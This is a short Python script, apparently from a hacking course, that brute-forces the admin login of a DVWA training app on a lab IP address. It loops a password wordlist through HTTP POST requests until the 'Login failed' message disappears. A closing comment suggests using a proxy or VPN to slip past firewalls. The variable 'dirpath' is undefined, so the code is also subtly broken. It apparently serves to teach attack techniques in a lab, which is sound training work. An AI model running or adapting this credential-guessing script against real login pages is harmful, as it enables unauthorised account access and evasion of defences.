#!/usr/bin/env python
#this script uses the requests.post method to submit a request to a web form
import requests

target_url = "http://10.0.2.7/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit" }

with open(dirpath + "/passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        #print(response.content)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line and could not find password.")

#remember that this will only work for sites with no captcha and no firewall
#can implement a proxy or vpn to change the IP address you are coming from to fool firewall.